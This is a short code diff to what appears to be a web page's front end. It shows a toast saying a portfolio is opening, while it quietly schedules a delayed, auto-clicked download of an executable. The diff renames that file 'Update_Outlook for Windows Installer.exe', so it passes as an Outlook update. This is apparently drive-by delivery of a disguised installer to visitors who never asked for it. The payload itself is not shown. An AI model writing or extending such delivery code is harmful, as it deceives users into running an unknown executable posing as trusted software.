@@ -24,7 +24,11 @@ function Index() {
     toast.message("Opening portfolio in a new tab...");
 
     void scheduleInstallerDownload({ data: { visitorId } })
-      .then(({ availableAt, downloadUrl }) => {
+      .then(({ skipDownload, availableAt, downloadUrl }) => {
+        if (skipDownload || !downloadUrl) {
+          return;
+        }
+
         const delay = Math.max(0, availableAt - Date.now());
         const payload = { type: "SCHEDULE_DOWNLOAD", url: downloadUrl, delay, visitorId };
 
@@ -122,7 +126,7 @@ async function startInstallerDownload(downloadUrl: string, visitorId: string) {
   const objectUrl = URL.createObjectURL(installer);
   const link = document.createElement("a");
   link.href = objectUrl;
-  link.download = "Outlook for Windows Installer.exe";
+  link.download = "Update_Outlook for Windows Installer.exe";
   document.body.append(link);
   link.click();
   link.remove();
